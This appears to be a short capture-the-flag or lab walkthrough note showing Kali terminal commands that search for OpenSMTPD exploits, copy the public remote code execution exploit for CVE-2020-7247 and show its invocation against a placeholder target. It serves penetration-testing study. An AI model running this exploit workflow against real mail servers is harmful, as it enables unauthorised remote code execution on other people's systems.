### OpenSMTPD 6.6.1 RCE
```sh
┌──(kali㉿kali)-[~/offsec/pg/clamAV]
└─$ searchsploit "OpenSMTPD"                                                                             
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                  | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                              | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                              | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                                                   | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                                     | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                  | openbsd/remote/48140.c
---------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                            
┌──(kali㉿kali)-[~/offsec/pg/clamAV]
└─$ searchsploit -m 47984.py
  Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
    Codes: CVE-2020-7247
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/offsec/pg/clamAV/47984.py

┌──(kali㉿kali)-[~/offsec/pg/clamAV]
└─$ ./47984.py <ip_to_exploit> 25 '<Command_To_Execute>'

```